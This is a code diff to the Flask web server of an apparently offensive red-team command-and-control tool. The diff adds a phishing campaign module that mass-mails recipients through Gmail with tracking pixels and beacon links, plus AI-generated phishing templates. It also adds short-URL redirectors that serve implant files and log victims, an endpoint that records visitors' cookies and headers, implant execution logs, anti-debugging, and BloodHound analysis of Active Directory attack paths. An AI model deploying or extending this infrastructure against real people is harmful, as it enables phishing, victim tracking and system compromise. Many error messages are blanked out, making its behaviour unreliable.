@@ -3,6 +3,7 @@ import os
 import csv
 import pty
 import sys
+import ssl
 import json
 import yaml
 import glob
@@ -14,27 +15,37 @@ import socket
 import base64
 import select
 import struct
+import yagmail
+import smtplib
+import secrets
 import termios
+import sqlite3
 import logging
 import zipfile
 import requests
 import markdown
 import threading
+import validators
 import subprocess
 import pandas as pd
 from math import ceil
 from io import StringIO 
 from functools import wraps
 from threading import Thread
-from datetime import datetime
 from lazyown import LazyOwnShell
+from flask_limiter import Limiter
+from urllib.parse import urlparse
+from collections import defaultdict
 from modules.colors import retModel
+from email.mime.text import MIMEText
+from email.mime.image import MIMEImage
 from watchdog.observers import Observer
+from datetime import datetime, timezone
 from werkzeug.utils import secure_filename
+from email.mime.multipart import MIMEMultipart
 from dnslib.server import DNSServer, DNSLogger
-from flask_socketio import SocketIO, send, emit
 from jinja2 import Environment, FileSystemLoader
-from utils import getprompt, Config, load_payload
+from flask_limiter.util import get_remote_address
 from watchdog.events import FileSystemEventHandler
 from modules.lazygptcli2 import process_prompt, Groq
 from modules.lazygptvulns import process_prompt_vuln
@@ -45,7 +56,10 @@ from modules.lazygptcli3 import process_prompt_script
 from modules.lazygptcli5 import process_prompt_general
 from cryptography.hazmat.backends import default_backend
 from modules.lazygptcli4 import process_prompt_adversary
+from flask_socketio import SocketIO, send, emit, disconnect
+from modules.lazyphishingai import process_prompt_local_yaml
 from dnslib.server import DNSServer, BaseResolver, DNSLogger
+from utils import getprompt, Config, load_payload, anti_debug
 from modules.lazydeepseekcli_local import process_prompt_local
 from modules.lazydeepseekcli_localreport import process_prompt_localreport
 from werkzeug.security import generate_password_hash, check_password_hash
@@ -53,15 +67,20 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from dnslib import DNSRecord, DNSHeader, RR, QTYPE, A, TXT, CNAME, MX, NS, SOA, CAA, TLSA, SSHFP
 from dnslib.dns import RR, QTYPE, A, NS, SOA, TXT, CNAME, MX, AAAA, PTR, SRV, NAPTR, CAA, TLSA, SSHFP
 from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
-from flask import Flask, request, render_template, redirect, url_for, jsonify, Response, send_from_directory, render_template_string, flash, abort, jsonify, Response, stream_with_context
+from flask import Flask, request, render_template, redirect, url_for, jsonify, Response, send_from_directory, render_template_string, flash, abort, jsonify, Response, stream_with_context, Blueprint, send_file
 
-
+anti_debug()
 logger = logging.getLogger(__name__)
+
+
 config = Config(load_payload())
+phishing_bp = Blueprint('phishing', __name__, template_folder='templates/phishing')
+
 if config.enable_c2_debug == True:
-    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+    logging.basicConfig(filename='sessions/access.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 else:
-    logging.basicConfig(level=logging.CRITICAL, format='%(asctime)s - %(levelname)s - %(message)s')
+    logging.basicConfig(filename='sessions/access.log', level=logging.CRITICAL, format='%(asctime)s - %(levelname)s - %(message)s')
+
 class Handler(FileSystemEventHandler):
     @staticmethod
     def on_any_event(event):
@@ -167,6 +186,91 @@ def implants_check():
                 if config.enable_c2_debug == True:
                     logger.info(f"[Error] reading file")
 
+def extract_attack_vectors(nodes, edges):
+    """
+    Analyzes BloodHound nodes and edges to extract critical attack vectors for AD compromise.
+
+    Args:
+        nodes (list): List of node dictionaries from process_bloodhound_zip.
+        edges (list): List of edge dictionaries from process_bloodhound_zip.
+
+    Returns:
+        dict: Structured data containing critical attack vectors.
+    """
+    ad_data = {
+        'privileged_accounts': [],
+        'dangerous_permissions': [],
+        'potential_attack_paths': [],
+        'misconfigurations': []
+    }
+
+    
+    for node in nodes:
+        if node.get('type') in ['User', 'Group'] and node.get('label', '').lower() in [
+            'domain admins', 'enterprise admins', 'administrators'
+        ]:
+            ad_data['privileged_accounts'].append({
+                'id': node['id'],
+                'label': node['label'],
+                'type': node['type'],
+                'details': node['title']
+            })
+
+    
+    dangerous_rights = ['GenericAll', 'WriteDacl', 'WriteOwner', 'Owns', 'AllExtendedRights', 'DCSync']
+    for edge in edges:
+        if edge['label'] in dangerous_rights:
+            source_node = next((n for n in nodes if n['id'] == edge['from']), None)
+            target_node = next((n for n in nodes if n['id'] == edge['to']), None)
+            if source_node and target_node:
+                ad_data['dangerous_permissions'].append({
+                    'from': source_node['label'],
+                    'to': target_node['label'],
+                    'right': edge['label'],
+                    'source_type': source_node['type'],
+                    'target_type': target_node['type']
+                })
+
+    
+    domain_admin_group = next(
+        (n for n in nodes if n.get('label', '').lower() == 'domain admins'), None
+    )
+    if domain_admin_group:
+        paths = []
+        for edge in edges:
+            if edge['to'] == domain_admin_group['id'] and edge['label'] == 'MemberOf':
+                source_node = next((n for n in nodes if n['id'] == edge['from']), None)
+                if source_node:
+                    paths.append({
+                        'path': f"{source_node['label']} -> Domain Admins",
+                        'type': source_node['type'],
+                        'details': f"{source_node['type']} has direct membership to Domain Admins"
+                    })
+            
+            if edge['label'] in ['AdminTo', 'DCSync']:
+                source_node = next((n for n in nodes if n['id'] == edge['from']), None)
+                target_node = next((n for n in nodes if n['id'] == edge['to']), None)
+                if source_node and target_node:
+                    paths.append({
+                        'path': f"{source_node['label']} -> {target_node['label']}",
+                        'type': edge['label'],
+                        'details': f"{source_node['type']} has {edge['label']} rights on {target_node['type']}"
+                    })
+        ad_data['potential_attack_paths'] = paths
+
+    
+    for node in nodes:
+        if node.get('type') == 'Computer':
+            properties = json.loads(node.get('title', '{}'))
+            if properties.get('unconstraineddelegation', False):
+                ad_data['misconfigurations'].append({
+                    'label': node['label'],
+                    'type': 'Unconstrained Delegation',
+                    'details': 'Computer allows unconstrained delegation, enabling potential privilege escalation.'
+                })
+
+    return ad_data
+
 def process_bloodhound_zip(zip_filepath):
     """
     Processes a BloodHound ZIP file to extract nodes and edges for graph visualization.
@@ -175,7 +279,7 @@ def process_bloodhound_zip(zip_filepath):
         zip_filepath (str): The path to the BloodHound ZIP file.
 
     Returns:
-        tuple: (nodes, edges, error_message). Nodes and edges for viz.js, and an error message if any.
+        tuple: (nodes, edges, error_message, ad_data). Nodes, edges, attack vectors for viz.js, and error message.
     """
     nodes_data = {}
     edges_data = []
@@ -185,7 +289,7 @@ def process_bloodhound_zip(zip_filepath):
         with zipfile.ZipFile(zip_filepath, 'r') as zip_ref:
             json_files = [name for name in zip_ref.namelist() if name.endswith(".json")]
             if not json_files:
-                return [], [], "No JSON files found in the ZIP"
+                return [], [], "No JSON files found in the ZIP", {}
 
             for name in json_files:
                 with zip_ref.open(name) as f:
@@ -196,7 +300,6 @@ def process_bloodhound_zip(zip_filepath):
                         if config.enable_c2_debug == True:
                             logger.info(f"Data structure: {json.dumps(data, indent=2)[:500]}...")  
 
-                        
                         items = data.get('data', []) if isinstance(data, dict) else data
 
                         if not isinstance(items, list):
@@ -205,7 +308,6 @@ def process_bloodhound_zip(zip_filepath):
                             continue
 
                         for item in items:
-                            
                             if 'ObjectIdentifier' in item and 'Properties' in item:
                                 node_id = item['ObjectIdentifier']
                                 if node_id not in nodes_data:
@@ -217,7 +319,6 @@ def process_bloodhound_zip(zip_filepath):
                                         'type': name.split('_')[1].replace('.json', '')  
                                     }
 
-                            
                             if 'Aces' in item and isinstance(item['Aces'], list):
                                 for ace in item['Aces']:
                                     if 'PrincipalSID' in ace and 'RightName' in ace:
@@ -227,7 +328,6 @@ def process_bloodhound_zip(zip_filepath):
                                             'label': ace['RightName']
                                         })
 
-                            
                             if 'PrimaryGroupSID' in item and item['PrimaryGroupSID']:
                                 edges_data.append({
                                     'from': item['ObjectIdentifier'],
@@ -237,27 +337,33 @@ def process_bloodhound_zip(zip_filepath):
 
                     except json.JSONDecodeError as e:
                         if config.enable_c2_debug == True:
-                            logger.info(f"Error decoding JSON in {name}: ")
-                        error_message = f"Error decoding JSON in {name}: "
+                            logger.info(f"Error decoding JSON in {name}: {str("")}")
+                        error_message = f"Error decoding JSON in {name}: {str("")}"
                     except Exception as e:
                         if config.enable_c2_debug == True:
-                            logger.info(f"Error processing {name}: ")
-                        error_message = f"Error processing {name}: "
+                            logger.info(f"Error processing {name}: {str("")}")
+                        error_message = f"Error processing {name}: {str("")}"
 
         if not nodes_data and not edges_data:
             error_message = "No valid nodes or edges extracted from the ZIP"
 
+
+        ad_data = extract_attack_vectors(list(nodes_data.values()), edges_data)
+
     except FileNotFoundError:
         error_message = f"File not found: {zip_filepath}"
         logger.info(error_message)
+        ad_data = {}
     except zipfile.BadZipFile:
         error_message = f"Invalid or corrupted ZIP file: {zip_filepath}"
         logger.info(error_message)
+        ad_data = {}
     except Exception as e:
-        error_message = f"An unexpected error occurred:"
+        error_message = f"An unexpected error occurred: {str("")}"
         logger.info(error_message)
+        ad_data = {}
 
-    return list(nodes_data.values()), edges_data, error_message
+    return list(nodes_data.values()), edges_data, error_message, ad_data
 
 def start_watching():
     event_handler = Handler()
@@ -533,9 +639,9 @@ def aicmd_deepseek(cmd):
 
 def aicmd(cmd):
     #if cmd == 'ping':
-    #    ping = shell.one_cmd("ping")
-    #    ping = strip_ansi(ping)
-    #    return ping
+    #ping = shell.one_cmd("ping")
+    #ping = strip_ansi(ping)
+    #return ping
 
 
     cmd_string = cmd
@@ -977,6 +1083,184 @@ def add_dynamic_data(data):
     data['timestamp'] = 'now' 
 
     return data
+def get_client_ip():
+    """Get the client's IP address, handling proxies."""
+    if request.headers.getlist("X-Forwarded-For"):
+        ip = request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
+    else:
+        ip = request.remote_addr
+    return ip
+
+def get_request_details():
+    """Collect comprehensive request details."""
+    timestamp = datetime.now(timezone.utc).isoformat()
+    parsed_url = urlparse(request.url)
+    query_string = parsed_url.query
+    headers = dict(request.headers)
+    form_data = request.form.to_dict() if request.form else {}
+    json_data = request.get_json(silent=True) or {}
+    args = request.args.to_dict()
+    method = request.method
+    path = parsed_url.path
+    host = parsed_url.hostname or socket.gethostname()
+    user_agent = headers.get('User-Agent', 'Unknown')
+    referrer = headers.get('Referer', 'Unknown')
+    cookies = request.cookies
+
+    return {
+        'id': SESSION_ID,
+        'timestamp': timestamp,
+        'method': method,
+        'url': request.url,
+        'path': path,
+        'query_string': query_string,
+        'query_params': args,
+        'form_data': form_data,
+        'json_data': json_data,
+        'client_ip': get_client_ip(),
+        'host': host,
+        'headers': headers,
+        'user_agent': user_agent,
+        'referrer': referrer,
+        'cookies': cookies
+    }
+
+def save_to_log(data):
+    """Append request data to the JSON log file."""
+    try:
+        with open(LOG_FILE, 'a') as f:
+            json.dump(data, f, indent=2)
+            f.write('\n')
+    except Exception as e:
+        return {'error': f'Failed to save log:'}, 500
+
+def parse_access_log_for_short_url(short_url):
+    """Parse access.log for entries matching the given short URL."""
+    download_events = []
+    log_pattern = re.compile(
+        r'(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2},\d{3}) - INFO - Short URL (.+?) accessed by (.+?) with (.+)'
+    )
+    try:
+        with open('sessions/access.log', 'r') as f:
+            for line in f:
+                match = log_pattern.match(line.strip())
+                if match and match.group(2) == short_url:
+                    timestamp, short_url, ip, user_agent = match.groups()
+                    download_events.append({
+                        'short_url': short_url,
+                        'ip': ip,
+                        'user_agent': user_agent,
+                        'timestamp': timestamp
+                    })
+    except FileNotFoundError:
+        logging.error("access.log not found")
+    except Exception as e:
+        logging.error(f"Error parsing access.log: {str("")}")
+    return download_events
+
+def parse_execution_log(implante):
+    """Parse execution log for the given implante, returning execution events."""
+    execution_events = []
+    log_file = os.path.join(SESSIONS_DIR, f'{implante}.log')
+    if not os.path.exists(log_file):
+        logging.warning(f"Execution log not found: {log_file}")
+        return execution_events
+    with open(log_file, 'r') as f:
+        reader = csv.DictReader(f)
+        for row in reader:
+            execution_events.append({
+                'client_id': row['client_id'],
+                'os': row['os'],
+                'pid': row['pid'],
+                'hostname': row['hostname'],
+                'ips': row['ips'],
+                'user': row['user'],
+                'command': row['command'],
+                'output': row['output'].strip(),
+                'timestamp': datetime.now().isoformat()
+            })
+    return execution_events
+
+def load_implant_config(implante):
+    """Load implant configuration from JSON file."""
+    config_file = os.path.join(SESSIONS_DIR, f'implant_config_{implante}.json')
+    if not os.path.exists(config_file):
+        logging.warning(f"Implant config not found: {config_file}")
+        return {}
+    with open(config_file, 'r') as f:
+        return json.load(f)
+
+def load_short_urls():
+    """Load short URLs from JSON file, creating it if it doesn't exist."""
+    if not os.path.exists(SHORT_URLS_FILE):
+        try:
+            with open(SHORT_URLS_FILE, 'w') as f:
+                json.dump({}, f)
+        except Exception as e:
+            logging.error(f"Failed to create short_urls.json: {str("")}")
+            raise
+    try:
+        with open(SHORT_URLS_FILE, 'r') as f:
+            return json.load(f)
+    except json.JSONDecodeError as e:
+        logging.error(f"Failed to parse short_urls.json: {str("")}")
+        return {}
+    except Exception as e:
+        logging.error(f"Error reading short_urls.json: {str("")}")
+        raise
+
+
+def save_short_urls(data):
+    """Save short URLs to JSON file."""
+    try:
+        with open(SHORT_URLS_FILE, 'w') as f:
+            json.dump(data, f, indent=2)
+    except Exception as e:
+        logging.error(f"Failed to save short_urls.json: {str("")}")
+        raise
+
+def is_valid_url(url):
+    """Validate if the input is a valid URL or existing local file path."""
+    if validators.url(url):
+        logging.info(f"Valid web URL: {url}")
+        return True
+    parsed_url = urlparse(url)
+    if parsed_url.scheme == 'file' or not parsed_url.scheme:
+        file_path = parsed_url.path if parsed_url.scheme == 'file' else url
+        file_path = os.path.abspath(file_path)
+        if os.path.exists(file_path) and os.path.isfile(file_path):
+            logging.info(f"Valid local file: {file_path}")
+            return True
+        logging.warning(f"Local file does not exist or is not a file: {file_path}")
+    logging.warning(f"Invalid URL or file path: {url}")
+    return False
+
+def analyze_behavioral_data(behavioral_events):
+    """Analyze behavioral events using Groq AI to generate risk scores."""
+    client = Groq(api_key=GROQ_API_KEY)
+    analysis_results = []
+    for event in behavioral_events:
+        prompt = f"""
+        Analyze the following user interaction:
+        - Event: {event['event_type']}
+        - IP: {event['ip']}
+        - User Agent: {event['user_agent']}
+        - Behavior Data: {event['behavior_data']}
+        - Timestamp: {event['timestamp']}
+        Determine a risk score (0-100) based on suspicious behavior (e.g., rapid clicks, unusual IPs).
+        """
+        response = client.chat.completions.create(
+            model="llama3-70b-8192",
+            messages=[{"role": "user", "content": prompt}],
+            max_tokens=100
+        )
+        risk_score = int(response.choices[0].message.content.strip()) if response.choices[0].message.content.strip().isdigit() else 50
+        analysis_results.append({
+            'email': event['email'],
+            'event_type': event['event_type'],
+            'risk_score': risk_score
+        })
+    return analysis_results
 
 SAVE_DIR = "sessions/captured_images"
 if not os.path.exists(SAVE_DIR):
@@ -984,9 +1268,14 @@ if not os.path.exists(SAVE_DIR):
 
 
 app = Flask(__name__, static_folder='static')
-app.secret_key = 'GrisIsComebackSayKnokKnokSecretlyxDjajajja'
 
-
+limiter = Limiter(
+    app=app,
+    key_func=get_remote_address,
+    default_limits=["2000 per day", "500 per hour"]
+)
+SESSION_ID = str(uuid.uuid4())
+app.secret_key = 'GrisIsComebackSayKnokKnokSecretlyxDjajajja' + SESSION_ID
 app.config['SECRET_KEY'] = app.secret_key
 app.config['SESSION_COOKIE_SECURE'] = True  
 app.config['SESSION_COOKIE_HTTPONLY'] = True
@@ -1024,7 +1313,37 @@ login_manager.login_view = 'login'
 USER_DATA_PATH = 'users.json'
 ENV = "PROD"
 DATA_FILE = BASE_DIR + 'surface_attack.json'
-
+LOG_DIR = os.path.join('sessions', 'logs', 'c2')
+LOG_FILE = os.path.join(LOG_DIR, 'log_c2.txt')
+CAMPAIGNS_DIR = os.path.join(os.getcwd(), 'sessions', 'phishing', 'campaigns')
+TEMPLATES_DIR = os.path.join(os.getcwd(), 'templates', 'phishing', 'emails')
+DB_PATH = os.path.join(os.getcwd(), 'sessions', 'phishing', 'tracking.db')
+GMAIL_ADDRESS = config.email_username
+GMAIL_APP_PASSWORD = config.email_password
+SESSIONS_PHISHING_DIR = os.path.join(os.getcwd(), 'sessions', 'phishing', 'campaigns')
+SHORT_URLS_FILE = SESSIONS_PHISHING_DIR + '/short_urls.json'
+SESSIONS_DIR = os.path.join(os.getcwd(), 'sessions')
+GROQ_API_KEY = config.api_key
+os.makedirs(LOG_DIR, exist_ok=True)
+os.makedirs(CAMPAIGNS_DIR, exist_ok=True)
+os.makedirs(TEMPLATES_DIR, exist_ok=True)
+conn = sqlite3.connect(DB_PATH)
+conn.execute('''CREATE TABLE IF NOT EXISTS tracking
+                (campaign_id TEXT, email TEXT, event TEXT, ip TEXT, timestamp TEXT)''')
+conn.commit()
+conn.execute('''CREATE TABLE IF NOT EXISTS behavioral_tracking (
+    id INTEGER PRIMARY KEY AUTOINCREMENT, 
+    campaign_id TEXT,
+    short_url TEXT,
+    email TEXT,
+    event_type TEXT,
+    ip TEXT,
+    user_agent TEXT,
+    timestamp TEXT,
+    behavior_data TEXT
+)''')
+conn.commit()
+conn.close()
 with open(f"{path}/sessions/key.aes", 'rb') as f:
     AES_KEY = f.read()
 
@@ -1140,6 +1459,7 @@ def index():
         logger.info(user_agent)
         logger.info(host)
     prompt = getprompt()
+    short_urls = load_short_urls()
     prompt = prompt.replace('\n','<br>')
     sessions_dir = f'{path}/sessions'
     json_files = [f for f in os.listdir(sessions_dir) if f.endswith('.json')]
@@ -1259,6 +1579,7 @@ def index():
         local_ips= local_ips,
         discovered_ips=discovered_ips,
         result_portscan=result_portscan,
+        short_urls=short_urls,
         c2_port=lport
     )
 
@@ -1464,7 +1785,7 @@ from flask import Flask, Response, jsonify
 @app.route(f'{route_maleable}download/<path:file_path>', methods=['GET'])
 def serve_file(file_path):
     temp_dir = os.path.join(os.getcwd(), 'sessions/temp_uploads')
-    
+   ## file_path = secure_filename(file_path) this broken the implant downloads #TODO see what happends 
     
     requested_path = os.path.join(temp_dir, file_path)
     
@@ -1491,7 +1812,124 @@ def serve_file(file_path):
     else:
         return jsonify({"status": "error", "message": "File not found"}), 404
 
+@app.route('/log/<path:data>', methods=['GET', 'POST'])
+@app.route(f'{route_maleable}/log/<path:data>', methods=['GET', 'POST'])
+def log(data):
+    """Log all request details to a JSON file."""
+    try:
+        request_details = get_request_details()
+        request_details['data'] = data
+        response = save_to_log(request_details)
+        if isinstance(response, tuple):
+            return jsonify(response[0]), response[1]
+        return jsonify({'status': 'logged', 'id': SESSION_ID}), 200
+    except Exception as e:
+        return jsonify({'error': str("")}), 500
 
+@app.route('/create_short_url', methods=['POST'])
+@requires_auth
+def create_short_url():
+    """Create multiple short URLs for a single original URL."""
+    data = request.get_json()
+    if not data:
+        logging.warning("No JSON data received in create_short_url")
+        return jsonify({'error': 'No data provided'}), 400
+    original_url = data.get('original_url')
+    custom_short_url = data.get('custom_short_url')
+    count = data.get('count', 1)  # Number of URLs to generate
+    if not original_url:
+        logging.warning("No original_url provided")
+        return jsonify({'error': 'Original URL is required'}), 400
+    if not is_valid_url(original_url):
+        return jsonify({'error': 'Invalid URL or file path.'}), 400
+    short_urls = load_short_urls()
+    generated_urls = []
+    for _ in range(count):
+        short_url = custom_short_url if custom_short_url and not generated_urls else secrets.token_urlsafe(6)
+        if short_url in short_urls:
+            continue
+        short_urls[short_url] = {
+            'original_url': original_url,
+            'active': True,
+            'created_at': datetime.now().isoformat()
+        }
+        generated_urls.append(short_url)
+    save_short_urls(short_urls)
+    logging.info(f"Created short URLs: {generated_urls} -> {original_url}")
+    return jsonify({'short_urls': generated_urls})
+
+@app.route('/track/<short_url>', methods=['GET'])
+def track_interaction(short_url):
+    """Serve tracking page and log behavioral data."""
+    short_urls = load_short_urls()
+    if short_url not in short_urls or not short_urls[short_url]['active']:
+        logging.warning(f"Short URL not found or inactive: {short_url}")
+        abort(404)
+    client_ip = request.remote_addr
+    user_agent = request.headers.get('User-Agent')
+    behavior_data = request.args.get('behavior', '{}')
+    email = request.args.get('email', 'unknown')
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    cursor.execute(
+        'INSERT INTO behavioral_tracking (campaign_id, short_url, email, event_type, ip, user_agent, timestamp, behavior_data) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
+        ('unknown', short_url, email, 'click', client_ip, user_agent, datetime.now().isoformat(), behavior_data)
+    )
+    conn.commit()
+    conn.close()
+    return render_template('tracking_page.html', short_url=short_url, original_url=short_urls[short_url]['original_url'])
+
+@app.route('/update_short_url/<short_url>', methods=['PUT'])
+@requires_auth
+def update_short_url(short_url):
+    try:
+        data = request.get_json()
+        new_original_url = data.get('original_url')
+        active = data.get('active')
+
+        if new_original_url and not is_valid_url(new_original_url):
+            return jsonify({'error': 'Invalid URL format'}), 400
+
+        short_urls = load_short_urls()
+        if short_url not in short_urls:
+            return jsonify({'error': 'Short URL not found'}), 404
+
+        if new_original_url:
+            short_urls[short_url]['original_url'] = new_original_url
+        if active is not None:
+            short_urls[short_url]['active'] = active
+        
+        save_short_urls(short_urls)
+        logging.info(f"Updated short URL: {short_url}")
+        return jsonify({'message': 'Updated successfully'})
+    except Exception as e:
+        logging.error(f"Error in update_short_url: {str("")}")
+        return jsonify({'error': f'Internal server error: {str("")}'}), 500
+
+@app.route('/<short_url>')
+def redirect_to_file(short_url):
+    try:
+        short_urls = load_short_urls()
+        if short_url not in short_urls or not short_urls[short_url]['active']:
+            logging.warning(f"Short URL not found or inactive: {short_url}")
+            abort(404)
+        original_url = short_urls[short_url]['original_url']
+        client_ip = request.remote_addr
+        user_agent = request.headers.get('User-Agent')
+        logging.info(f"Short URL {short_url} accessed by {client_ip} with {user_agent}")
+        parsed_url = urlparse(original_url)
+        if parsed_url.scheme == 'file' or not parsed_url.scheme:
+            file_path = parsed_url.path if parsed_url.scheme == 'file' else original_url
+            file_path = os.path.abspath(file_path)
+            if os.path.exists(file_path) and os.path.isfile(file_path):
+                return send_file(file_path)
+            else:
+                logging.warning(f"File not found: {file_path}")
+                abort(404)
+        return redirect(original_url)
+    except Exception as e:
+        logging.error(f"Error in redirect_to_file: {str("")}")
+        return jsonify({'error': f'Internal server error: {str("")}'}), 500
 
 @app.route('/view_yaml', methods=['POST'])
 @requires_auth
@@ -2304,6 +2742,7 @@ def register():
     return render_template('register.html')
 
 @app.route('/login', methods=['GET', 'POST'])
+@limiter.limit("5 per minute")
 def login():
     response = decoy()
     if response:
@@ -2618,6 +3057,9 @@ def terminal():
 
 @socketio.on('connect', namespace='/terminal')
 def handle_connect():
+    if not current_user.is_authenticated:
+        disconnect()
+        return False
     if config.enable_c2_debug == True:
         logger.info("Cliente conectado a /terminal")
 
@@ -2783,36 +3225,29 @@ def upload_zip_file():
     if file.filename == '':
         return render_template('index.html', error="No selected file")
     
-    
     if not file.filename.lower().endswith('.zip'):
         return render_template('index.html', error="Only ZIP files are allowed")
 
-    
     os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
 
-    
     unique_filename = f"{uuid.uuid4().hex}.zip"
     filepath = os.path.join(app.config['UPLOAD_FOLDER'], unique_filename)
 
-    
     abs_upload_folder = os.path.abspath(app.config['UPLOAD_FOLDER'])
     abs_filepath = os.path.abspath(filepath)
     if not abs_filepath.startswith(abs_upload_folder):
         return render_template('index.html', error="Invalid file path")
 
     try:
-        
         file.save(filepath)
         
-        
-        nodes, edges, error_message = process_bloodhound_zip(filepath)
+        nodes, edges, error_message, ad_data = process_bloodhound_zip(filepath)
 
-        
         try:
             os.remove(filepath)
         except Exception as e:
             if config.enable_c2_debug:
-                logger.info(f"Error removing file: {str(e)}")
+                logger.info(f"Error removing file: {str("")}")
 
         if error_message:
             if config.enable_c2_debug:
@@ -2825,21 +3260,168 @@ def upload_zip_file():
         if config.enable_c2_debug:
             logger.info(f"Nodes extracted: {len(nodes)}")
             logger.info(f"Edges extracted: {len(edges)}")
-        return render_template('surface.html', nodes=nodes, edges=edges)
+            logger.info(f"Attack vectors extracted: {len(ad_data)}")
+        return render_template('surface.html', nodes=nodes, edges=edges, ad_data=ad_data)
 
     except Exception as e:
-        
         if os.path.exists(filepath):
             try:
                 os.remove(filepath)
             except Exception as cleanup_error:
                 if config.enable_c2_debug:
-                    logger.info(f"Error removing file during cleanup: {str(cleanup_error)}")
-        return render_template('index.html', error=f"Error processing file: {str(e)}")
+                    logger.info(f"Error removing file during cleanup: {str("")}")
+        return render_template('index.html', error=f"Error processing file: {str("")}")
 
-    return render_template('index.html', error="Something went wrong")
+@phishing_bp.route('/phishing/campaigns', methods=['GET'])
+@login_required
+def list_campaigns():
+    campaigns = []
+    for filename in os.listdir(CAMPAIGNS_DIR):
+        if filename.endswith('.yaml'):
+            with open(os.path.join(CAMPAIGNS_DIR, filename)) as f:
+                campaign = yaml.safe_load(f)
+                campaign['id'] = filename.replace('.yaml', '')
+                campaigns.append(campaign)
+    return render_template('phishing/campaigns.html', campaigns=campaigns)
+
+@phishing_bp.route('/phishing/campaigns/new', methods=['GET', 'POST'])
+@login_required
+def create_campaign():
+    if request.method == 'POST':
+        data = request.form
+        campaign_id = str(uuid.uuid4())
+        campaign = {
+            'name': data['name'],
+            'template': data['template'],
+            'recipients': [r.strip() for r in data['recipients'].split(',')],
+            'beacon_url': data.get('beacon_url', ''),
+            'created_at': datetime.now(timezone.utc).isoformat()
+        }
+        try:
+            with open(os.path.join(CAMPAIGNS_DIR, f'{campaign_id}.yaml'), 'w') as f:
+                yaml.dump(campaign, f)
+            logger.debug(f"Campaign {campaign_id} saved successfully")
+        except Exception as e:
+            logger.error(f"Error saving campaign {campaign_id}: {e}")
+            return jsonify({"status": "error", "message": f"Failed to save campaign: {str("")}"}), 500
+
+        try:
+            with open(os.path.join(TEMPLATES_DIR, f"{campaign['template']}.yaml")) as f:
+                template = yaml.safe_load(f)
+
+            logger.debug("Initializing yagmail SMTP connection")
+            with yagmail.SMTP(GMAIL_ADDRESS, GMAIL_APP_PASSWORD) as yag:
+                for recipient in campaign['recipients']:
+                    tracking_url = url_for('phishing.track_pixel', campaign_id=campaign_id, email=recipient, _external=True)
+                    
+                    html_body = template['body'].format(
+                        name=recipient.split('@')[0],
+                        beacon_url=campaign['beacon_url'],
+                        tracking_pixel=f'<img src="{tracking_url}" width="1" height="1" alt="" />'
+                    )
+
+                    logger.debug(f"Sending email to {recipient} via Gmail")
+                    yag.send(
+                        to=recipient,
+                        subject=template['subject'],
+                        contents=html_body
+                    )
+                    logger.info(f"Successfully sent email to {recipient} via Gmail")
+
+                    conn = sqlite3.connect(DB_PATH)
+                    conn.execute('INSERT INTO tracking VALUES (?, ?, ?, ?, ?)',
+                                 (campaign_id, recipient, 'sent', request.remote_addr, datetime.utcnow().isoformat()))
+                    conn.commit()
+                    conn.close()
+
+            logger.info(f"Campaign {campaign_id} sent to {len(campaign['recipients'])} recipients via Gmail")
+            return redirect(url_for('phishing.list_campaigns'))
+        except Exception as e:
+            error_msg = f"Error sending campaign {campaign_id}: {str("")}"
+            logger.error(error_msg)
+            return jsonify({"status": "error", "message": str("")}), 500
+    templates = [f.replace('.yaml', '') for f in os.listdir(TEMPLATES_DIR) if f.endswith('.yaml')]
+    return render_template('phishing/new_campaign.html', templates=templates)
+
+@app.route('/lazyphishingai', methods=['POST'])
+def lazyphishingai():
+    data = request.json
+    prompt = data.get('prompt')
+    timestamp = time.time()
+    OUTPUT_FILE_YAML = TEMPLATES_DIR + f"/ai_template_{timestamp}.yaml"
+    if not prompt:
+        return jsonify({"error": "Insert Prompt"}), 400
+
+    if not isinstance(prompt, str):
+        prompt = str(prompt)
+
+    response = process_prompt_local_yaml(prompt, False, "web", OUTPUT_FILE_YAML)
+    return response
+
+@phishing_bp.route('/phishing/<campaign_id>/track/<email>')
+def track_pixel(campaign_id, email):
+    """Píxel de seguimiento para registrar aperturas."""
+    conn = sqlite3.connect(DB_PATH)
+    conn.execute('INSERT INTO tracking VALUES (?, ?, ?, ?, ?)',
+                 (campaign_id, email, 'opened', request.remote_addr, datetime.utcnow().isoformat()))
+    conn.commit()
+    conn.close()
     
+    with open(os.path.join(os.getcwd(), 'static', 'images', 'pixel.png'), 'rb') as f:
+        return f.read(), 200, {'Content-Type': 'image/png'}
 
+@phishing_bp.route('/phishing/<campaign_id>/report')
+@login_required
+def campaign_report(campaign_id):
+    """Generate report for a phishing campaign with tracking, download, and execution events."""
+    campaign_file = os.path.join(CAMPAIGNS_DIR, f'{campaign_id}.yaml')
+    if not os.path.exists(campaign_file):
+        logging.error(f"Campaign file not found: {campaign_file}")
+        abort(404)
+    with open(campaign_file) as f:
+        campaign = yaml.safe_load(f)
+        campaign['id'] = campaign_id
+
+    short_urls = load_short_urls()
+    beacon_url = campaign.get('beacon_url', '')
+    beacon_short_url = urlparse(beacon_url).path.lstrip('/') if beacon_url else ''
+
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    cursor.execute('SELECT event, COUNT(*) FROM tracking WHERE campaign_id = ? GROUP BY event', (campaign_id,))
+    stats = {row[0]: row[1] for row in cursor.fetchall()}
+    cursor.execute('SELECT email, event, ip, timestamp FROM tracking WHERE campaign_id = ? ORDER BY timestamp DESC', (campaign_id,))
+    events = [{'email': row[0], 'event': row[1], 'ip': row[2], 'timestamp': row[3]} for row in cursor.fetchall()]
+    cursor.execute('SELECT email, event_type, ip, user_agent, timestamp, behavior_data FROM behavioral_tracking WHERE campaign_id = ? OR short_url = ? ORDER BY timestamp DESC', (campaign_id, beacon_short_url))
+    behavioral_events = [{'email': row[0], 'event_type': row[1], 'ip': row[2], 'user_agent': row[3], 'timestamp': row[4], 'behavior_data': row[5]} for row in cursor.fetchall()]
+    conn.close()
+
+    download_events = []
+    execution_events = []
+    if beacon_short_url:
+        download_events = parse_access_log_for_short_url(beacon_short_url)
+        stats['downloaded'] = len(download_events)
+        stats['interactions'] = len(behavioral_events)
